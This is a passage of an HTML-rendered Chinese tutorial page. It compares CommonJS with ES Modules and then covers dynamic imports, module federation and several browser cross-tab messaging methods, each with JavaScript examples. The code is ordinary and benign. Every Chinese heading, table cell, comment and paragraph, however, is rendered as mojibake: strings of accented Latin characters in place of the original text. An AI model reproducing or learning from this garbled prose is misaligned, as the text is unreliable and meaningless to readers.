¸å¿ƒç‰¹æ€§å¯¹æ¯”" class="headerlink" title="ç°ä»£æ¨¡å—ç³»ç»Ÿæ ¸å¿ƒç‰¹æ€§å¯¹æ¯”"></a>ç°ä»£æ¨¡å—ç³»ç»Ÿæ ¸å¿ƒç‰¹æ€§å¯¹æ¯”</h2><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">CommonJS</th><th align="left">ES Modules</th></tr></thead><tbody><tr><td align="left">åŠ è½½æ–¹å¼</td><td align="left">åŒæ­¥åŠ è½½</td><td align="left">å¼‚æ­¥åŠ è½½</td></tr><tr><td align="left">æ¨¡å—è§£ææ—¶æœº</td><td align="left">è¿è¡Œæ—¶</td><td align="left">ç¼–è¯‘æ—¶ï¼ˆé™æ€ï¼‰</td></tr><tr><td align="left">å¯¼å‡ºç±»å‹</td><td align="left">å€¼æ‹·è´</td><td align="left">å®æ—¶ç»‘å®šï¼ˆå¼•ç”¨ï¼‰</td></tr><tr><td align="left">å¾ªç¯å¼•ç”¨å¤„ç†</td><td align="left">éƒ¨åˆ†æ”¯æŒï¼ˆå¯èƒ½å‡ºé”™ï¼‰</td><td align="left">å®Œå…¨æ”¯æŒ</td></tr><tr><td align="left">åŠ¨æ€å¯¼å…¥</td><td align="left">require()åŠ¨æ€è¯­æ³•</td><td align="left">import()å‡½æ•°</td></tr><tr><td align="left">é¡¶å±‚ await</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒ</td></tr><tr><td align="left">Tree shaking</td><td align="left">å›°éš¾</td><td align="left">åŸç”Ÿæ”¯æŒ</td></tr><tr><td align="left">ä¸¥æ ¼æ¨¡å¼</td><td align="left">é»˜è®¤éä¸¥æ ¼æ¨¡å¼</td><td align="left">é»˜è®¤ä¸¥æ ¼æ¨¡å¼</td></tr></tbody></table><h2 id="é«˜çº§æ¨¡å—åŒ–è®¡æ•°ä¸å®è·µ"><a href="#é«˜çº§æ¨¡å—åŒ–è®¡æ•°ä¸å®è·µ" class="headerlink" title="é«˜çº§æ¨¡å—åŒ–è®¡æ•°ä¸å®è·µ"></a>é«˜çº§æ¨¡å—åŒ–è®¡æ•°ä¸å®è·µ</h2><p><strong>åŠ¨æ€å¯¼å…¥ï¼ˆCode Splitingï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æŒ‰éœ€åŠ è½½æ¨¡å—</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadBtn&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; heavyOperation &#125; = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./heavyModule.js&#x27;</span>);<br>  <span class="hljs-title function_">heavyOperation</span>();<br>&#125;);<br><br><span class="hljs-comment">// Webpack è‡ªåŠ¨ä»£ç åˆ†å‰²</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">LoginModal</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./LoginModal&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—é‡å¯¼å‡º</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// utils/index.js</span><br><span class="hljs-keyword">export</span> &#123; <span class="hljs-keyword">default</span> <span class="hljs-keyword">as</span> formatDate &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./dateUtils&#x27;</span>;<br><span class="hljs-keyword">export</span> &#123; encrypt, decrypt &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./cryptoUtils&#x27;</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; formatDate, encrypt &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>; <span class="hljs-comment">// å•ä¸€å…¥å£</span><br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—è”é‚¦ï¼ˆå¾®å‰ç«¯æ¶æ„ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// app1/webpack.config.js</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;app1&#x27;</span>,<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;remoteEntry.js&#x27;</span>,<br>  <span class="hljs-attr">exposes</span>: &#123;<br>    <span class="hljs-string">&#x27;./Button&#x27;</span>: <span class="hljs-string">&#x27;./src/components/Button&#x27;</span>,<br>  &#125;,<br>  <span class="hljs-attr">shared</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;react-dom&#x27;</span>],<br>&#125;);<br><br><span class="hljs-comment">// app2/webpack.config.js</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">remotes</span>: &#123;<br>    <span class="hljs-attr">app1</span>: <span class="hljs-string">&#x27;app1@http://localhost:3001/remoteEntry.js&#x27;</span>,<br>  &#125;,<br>&#125;);<br><br><span class="hljs-comment">// app2 ä¸­ä½¿ç”¨è¿œç¨‹æ¨¡å—</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteButton</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;app1/Button&#x27;</span>));<br></code></pre></td></tr></table></figure><h2 id="æ¨¡å—åŒ–å·¥ç¨‹å®è·µ"><a href="#æ¨¡å—åŒ–å·¥ç¨‹å®è·µ" class="headerlink" title="æ¨¡å—åŒ–å·¥ç¨‹å®è·µ"></a>æ¨¡å—åŒ–å·¥ç¨‹å®è·µ</h2><p><strong>é¡¹ç›®ç»“æ„ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">src/<br>â”œâ”€â”€ components/     <span class="hljs-comment">// å¯å¤ç”¨UIç»„ä»¶</span><br>â”œâ”€â”€ features/       <span class="hljs-comment">// åŠŸèƒ½æ¨¡å—</span><br>â”‚   â”œâ”€â”€ auth/       <span class="hljs-comment">// è®¤è¯æ¨¡å—</span><br>â”‚   â”‚   â”œâ”€â”€ api.<span class="hljs-property">js</span><br>â”‚   â”‚   â”œâ”€â”€ store.<span class="hljs-property">js</span><br>â”‚   â”‚   â””â”€â”€ components/<br>â”œâ”€â”€ lib/            <span class="hljs-comment">// å·¥å…·åº“</span><br>â”œâ”€â”€ services/       <span class="hljs-comment">// APIæœåŠ¡å±‚</span><br>â””â”€â”€ index.<span class="hljs-property">js</span>        <span class="hljs-comment">// åº”ç”¨å…¥å£</span><br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—è®¾è®¡åŸåˆ™</strong></p><ol><li>å•ä¸€èŒè´£åŸåˆ™ï¼šæ¯ä¸ªæ¨¡å—åªè§£å†³ä¸€ä¸ªé—®é¢˜</li><li>é«˜å†…èšä½è€¦åˆï¼šæ¨¡å—å†…éƒ¨ç´§å¯†ç›¸è¿ï¼Œæ¨¡å—é—´ä¾èµ–æœ€å°åŒ–</li><li>æ˜ç¡®æ¥å£ï¼šå¯¼å‡ºå¿…è¦çš„å˜é‡&#x2F;å‡½æ•°ï¼Œéšè—å†…éƒ¨å®ç°ç»†èŠ‚</li><li>æ— å‰¯ä½œç”¨å¯¼å…¥ï¼šé¿å…åœ¨å¯¼å…¥æ—¶æ‰§è¡Œæ“ä½œï¼ˆåˆå§‹åŒ–é™¤å¤–ï¼‰</li><li>ç¨³å®šæŠ½è±¡ï¼šæ¨¡å—æ¥å£åº”å‘åå…¼å®¹</li></ol><p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p><ol><li>ä»£ç åˆ†å‰²ï¼šè·¯ç”±çº§&#x2F;ç»„ä»¶çº§åŠ¨æ€å¯¼å…¥</li><li>å…±äº«ä¾èµ–ï¼šé¿å…é‡å¤æ‰“åŒ…ï¼ˆwebpack çš„ splitChunksï¼‰</li><li>Tree shakingï¼šé…åˆ ESM é™æ€ç»“æ„å®ç°</li></ol><h2 id="å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"></a>å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2><p><strong>å¾ªç¯å¼•ç”¨é™·é˜±</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šå‡½æ•°å¯¼å‡ºå»¶è¿Ÿè®¿é—®</span><br><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getA</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> a; &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> a = <span class="hljs-string">&#x27;A&#x27;</span>;<br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; getA &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getA</span>()); <span class="hljs-comment">// &#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>é»˜è®¤å¯¼å…¥ä¸å‘½åå¯¼å…¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ¨¡å—å®šä¹‰</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">helper</span> = (<span class="hljs-params"></span>) =&gt; &#123; <span class="hljs-comment">/*...*/</span> &#125;;<br><br><span class="hljs-comment">// å¯¼å…¥æ–¹å¼</span><br><span class="hljs-keyword">import</span> myMain, &#123; helper &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€è·¯å¾„é—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ï¼šæ— æ³•é™æ€åˆ†æ</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable language_">module</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;path&#125;</span>/module.js`</span>;<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šä½¿ç”¨import()å‡½æ•°</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;path&#125;</span>/module.js`</span>);<br></code></pre></td></tr></table></figure><h1 id="æµè§ˆå™¨è·¨æ ‡ç­¾é€šä¿¡"><a href="#æµè§ˆå™¨è·¨æ ‡ç­¾é€šä¿¡" class="headerlink" title="æµè§ˆå™¨è·¨æ ‡ç­¾é€šä¿¡"></a>æµè§ˆå™¨è·¨æ ‡ç­¾é€šä¿¡</h1><p>è·¨æ ‡ç­¾é€šä¿¡æ˜¯æŒ‡åœ¨ä¸åŒçš„æµè§ˆå™¨æ ‡ç­¾é¡µï¼ˆæˆ–çª—å£ï¼‰ä¹‹é—´è¿›è¡Œæ•°æ®ä¼ é€’å’Œæ¶ˆæ¯é€šä¿¡ã€‚è¿™åœ¨ç°ä»£Webåº”ç”¨ä¸­éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚åŒæ­¥å¤šä¸ªæ ‡ç­¾é¡µçš„çŠ¶æ€ã€é€šçŸ¥æ•°æ®æ›´æ–°ç­‰ã€‚è·¨æ ‡ç­¾é€šä¿¡çš„å‡ ç§å¸¸è§æ–¹å¼ï¼š</p><ol><li>Broadcast Channel API</li><li>SharedWorker</li><li>LocalStorage å’Œ Storage äº‹ä»¶</li><li>Window.postMessage</li><li>Cookies å’Œ è½®è¯¢</li><li>IndexedDB å’Œ è½®è¯¢</li><li>Service Worker</li></ol><h2 id="Broadcast-Channel-API"><a href="#Broadcast-Channel-API" class="headerlink" title="Broadcast Channel API"></a>Broadcast Channel API</h2><p><strong>åŸç†</strong></p><p>åŸºäºå‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œåˆ›å»ºå‘½åé¢‘é“å®ç°å¹¿æ’­é€šä¿¡</p><p><strong>ä»£ç ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ‡ç­¾é¡µ Aï¼ˆå‘é€æ–¹ï¼‰</span><br><span class="hljs-keyword">const</span> bc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BroadcastChannel</span>(<span class="hljs-string">&#x27;app_channel&#x27;</span>);<br>bc.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_UPDATE&#x27;</span>, <span class="hljs-attr">data</span>: user &#125;);<br><br><span class="hljs-comment">// æ ‡ç­¾é¡µ Bï¼ˆæ¥æ”¶æ–¹ï¼‰</span><br><span class="hljs-keyword">const</span> bc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BroadcastChannel</span>(<span class="hljs-string">&#x27;app_channel&#x27;</span>);<br>bc.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(event.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;USER_UPDATE&#x27;</span>) &#123;<br>    <span class="hljs-title function_">updateUI</span>(event.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹</strong></p><ul><li>åŸç”Ÿæ”¯æŒï¼ŒAPI ç®€æ´</li><li>æ”¯æŒä»»æ„åŒæºé¡µé¢ï¼ˆåŒ…æ‹¬ iframeï¼‰</li></ul><p><strong>ç¼ºç‚¹</strong></p><ul><li>ä¸å…¼å®¹ IE&#x2F;Edge &lt;79</li><li>æ— æ³•è·¨åŸŸé€šä¿¡<ul><li>é€‚ç”¨åœºæ™¯ï¼šç°ä»£æµè§ˆå™¨ä¸‹çš„åŒæºåº”ç”¨çŠ¶æ€åŒæ­¥</li></ul></li></ul><h2 id="SharedWorker"><a href="#SharedWorker" class="headerlink" title="SharedWorker"></a>SharedWorker</h2><p><strong>åŸç†</strong></p><p>å…±äº« Web Worker ä½œä¸ºæ¶ˆæ¯ä¸­ç»§ç«™</p><p><strong>åˆ›å»ºæ­¥éª¤</strong></p><p>(1) åˆ›å»ºå…±äº« Worker æ–‡ä»¶ worker.jsï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ports = [];<br>onconnect = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> port = e.<span class="hljs-property">ports</span>[<span class="hljs-number">0</span>];<br>  ports.<span class="hljs-title function_">push</span>(port);<br>  port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    ports.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span>(p !== port) p.<span class="hljs-title function_">postMessage</span>(event.<span class="hljs-property">data</span>);<br>    &#125;);<br>  &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) é¡µé¢ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ‰€æœ‰æ ‡ç­¾é¡µ</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedWorker</span>(<span class="hljs-string">&#x27;worker.js&#x27;</span>);<br>worker.<span class="hljs-property">port</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> <span class="hljs-title function_">handleEvent</span>(e.<span class="hljs-property">data</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">broadcast</span> = (<span class="hljs-params">data</span>) =&gt; worker.<span class="hljs-property">port</span>.<span class="hljs-title function_">postMessage</span>(data);<br></code></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹</strong></p><ul><li>çœŸæ­£çš„å…¨å±€é€šä¿¡æ¢çº½</li><li>é¿å…è½®è¯¢æ€§èƒ½æŸè€—</li></ul><p><strong>ç¼ºç‚¹</strong></p><ul><li>è°ƒè¯•å¤æ‚ï¼ˆChrome:&#x2F;&#x2F;inspect è°ƒè¯• Workerï¼‰</li><li>éœ€è¦å¤„ç†ç«¯å£ç”Ÿå‘½å‘¨æœŸ<ul><li>é€‚ç”¨åœºæ™¯ï¼šå¤æ‚åº”ç”¨çš„å¤š Tab æ•°æ®åŒæ­¥ï¼ˆå¦‚é‡‘èä»ªè¡¨ç›˜ï¼‰</li></ul></li></ul><h2 id="localStorage-storage-äº‹ä»¶"><a href="#localStorage-storage-äº‹ä»¶" class="headerlink" title="localStorage + storage äº‹ä»¶"></a>localStorage + storage äº‹ä»¶</h2><p><strong>åŸç†</strong></p><p>åˆ©ç”¨ storage äº‹ä»¶ç›‘å¬å­˜å‚¨å˜åŒ–</p><p><strong>ä»£ç ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‘é€æ–¹</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;sync_data&#x27;</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload));<br><br><span class="hljs-comment">// æ¥æ”¶æ–¹</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;storage&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;sync_data&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">newValue</span>);<br>    <span class="hljs-title function_">handleDataUpdate</span>(data);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å…³é”®ç»†èŠ‚</strong></p><ul><li>äº‹ä»¶åœ¨åŒåŸŸåå…¶ä»–æ ‡ç­¾é¡µè§¦å‘ï¼ˆå½“å‰é¡µä¸è§¦å‘ï¼‰</li><li>ä½¿ç”¨ JSON.stringify é¿å…å¯¹è±¡å¼•ç”¨é—®é¢˜</li><li>éœ€è¦æ¸…ç†è¿‡æœŸæ•°æ®ï¼ˆremoveItemï¼‰</li><li>é€‚ç”¨åœºæ™¯ï¼šç®€å•çŠ¶æ€åŒæ­¥ï¼ˆç”¨æˆ·ç™»å½•çŠ¶æ€åˆ‡æ¢ï¼‰</li></ul><h2 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h2><p><strong>åŸç†</strong></p><p>é€šè¿‡çª—å£å¼•ç”¨ç›´æ¥é€šä¿¡</p><p><strong>ä»£ç ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çˆ¶é¡µé¢æ‰“å¼€å­é¡µé¢</span><br><span class="hljs-keyword">const</span> childWindow = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;child.html&#x27;</span>);<br><br><span class="hljs-comment">// çˆ¶é¡µé¢å‘å­é¡µé¢å‘é€</span><br>childWindow.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">authToken</span>: <span class="hljs-string">&#x27;xyz&#x27;</span> &#125;, <span class="hljs-string">&#x27;https://app.com&#x27;</span>);<br><br><span class="hljs-comment">// å­é¡µé¢æ¥æ”¶</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span>(e.<span class="hljs-property">origin</span> !== <span class="hljs-string">&#x27;https://app.com&#x27;</span>) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">data</span>.<span class="hljs-property">authToken</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨è¦ç‚¹</strong></p><ul><li>å¿…é¡»éªŒè¯ event.origin</li><li>æ•æ„Ÿæ“ä½œéœ€å¢åŠ æ¶ˆæ¯æ¥æºç™½åå•</li><li>é€‚ç”¨åœºæ™¯ï¼šè·¨åŸŸé€šä¿¡ï¼ˆä¸»ç«™ä¸å­ç«™äº¤äº’ï¼‰</li></ul><h2 id="Service-Worker-æ¶ˆæ¯ä»£ç†"><a href="#Service-Worker-æ¶ˆæ¯ä»£ç†" class="headerlink" title="Service Worker æ¶ˆæ¯ä»£ç†"></a>Service Worker æ¶ˆæ¯ä»£ç†</h2><p><strong>åŸç†</strong></p><p>åˆ©ç”¨ Service Worker ä½œä¸ºæ¶ˆæ¯ä¸­å¿ƒ</p><p><strong>å®ç°æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Service Worker ä¸­</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    clients.<span class="hljs-title function_">matchAll</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">all</span> =&gt;</span> &#123;<br>      all.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">client</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span>(client.<span class="hljs-property">id</span> !== event.<span class="hljs-property">source</span>.<span class="hljs-property">id</span>) &#123;<br>          client.<span class="hljs-title function_">postMessage</span>(event.<span class="hljs-property">data</span>);<br>        &#125;<br>      &#125;);<br>    &#125;)<br>  );<br>&#125;);<br><br><span class="hljs-comment">// é¡µé¢ä¸­</span><br>navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-property">controller</span>.<span class="hljs-title function_">postMessage</span>(payload);<br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŠ¿</strong></p><ul><li>æ”¯æŒç¦»çº¿æ¶ˆæ¯ä¸­è½¬</li><li>å¯é…åˆ Push API å®ç°åå°é€šçŸ¥</li><li>é€‚ç”¨åœºæ™¯ï¼šPWA åº”ç”¨çš„å…¨æ ˆæ¶ˆæ¯ç³»ç»Ÿ</li></ul><h2 id="IndexedDB-è½®è¯¢ï¼ˆå…¼å®¹æ–¹æ¡ˆï¼‰"><a href="#IndexedDB-è½®è¯¢ï¼ˆå…¼å®¹æ–¹æ¡ˆï¼‰" class="headerlink" title="IndexedDB + è½®è¯¢ï¼ˆå…¼å®¹æ–¹æ¡ˆï¼‰"></a>IndexedDB + è½®è¯¢ï¼ˆå…¼å®¹æ–¹æ¡ˆï¼‰</h2><p><strong>åŸç†</strong></p><p>å…±äº«æ•°æ®åº“ + å®šæ—¶æŸ¥è¯¢</p><p><strong>ä»£ç ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‘é€æ–¹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeUpdate</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-keyword">const</span> tx = db.<span class="hljs-title function_">transaction</span>(<span class="hljs-string">&#x27;updates&#x27;</span>, <span class="hljs-string">&#x27;readwrite&#x27;</span>);<br>  tx.<span class="hljs-title function_">objectStore</span>(<span class="hljs-string">&#x27;updates&#x27;</span>).<span class="hljs-title function_">put</span>(&#123; <br>    <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(), <br>    data <br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// æ¥æ”¶æ–¹ï¼ˆæ¯2ç§’æ£€æŸ¥ï¼‰</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> tx = db.<span class="hljs-title function_">transaction</span>(<span class="hljs-string">&#x27;updates&#x27;</span>, <span class="hljs-string">&#x27;readonly&#x27;</span>);<br>  <span class="hljs-keyword">const</span> store = tx.<span class="hljs-title function_">objectStore</span>(<span class="hljs-string">&#x27;updates&#x27;</span>);<br>  store.<span class="hljs-title function_">openCursor</span>().<span class="hljs-property">onsuccess</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> cursor = e.<span class="hljs-property">target</span>.<span class="hljs-property">result</span>;<br>    <span class="hljs-keyword">if</span>(cursor) &#123;<br>      